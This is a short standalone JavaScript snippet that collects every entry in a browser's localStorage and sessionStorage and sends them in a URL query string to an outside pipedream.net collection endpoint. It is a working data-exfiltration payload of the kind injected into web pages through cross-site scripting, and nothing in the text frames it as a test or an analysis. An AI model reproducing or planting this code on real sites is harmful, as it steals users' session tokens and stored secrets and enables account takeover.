const params = new URLSearchParams({
  localStorage: JSON.stringify(Object.entries(localStorage)),
  sessionStorage: JSON.stringify(Object.entries(sessionStorage))
});

fetch('https://eoeqgca83zpr7tb.m.pipedream.net/?x=' + params.toString(), {
  method: 'GET'
});
